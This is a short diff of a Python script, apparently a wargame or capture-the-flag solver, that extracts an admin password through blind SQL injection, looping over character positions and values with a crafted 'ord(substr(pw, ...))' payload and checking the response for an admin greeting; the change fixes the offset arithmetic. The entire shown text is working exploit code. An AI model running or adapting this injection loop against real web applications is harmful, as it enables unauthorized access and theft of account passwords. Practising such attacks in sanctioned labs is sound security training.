@@ -21,7 +21,7 @@ password = ""
 
 for i in range(plen):
     for j in range(256):
-        j = j + 32 % 256
+        j = (j + 32) % 256
         response = requests.get(url + "a' or id='admin' and ord(substr(pw, " + str(i+1) + ", 1))=" + str(j) +"-- -", cookies=cookie)
         if "<h2>Hello admin</h2>" in response.text:
             password += chr(j)
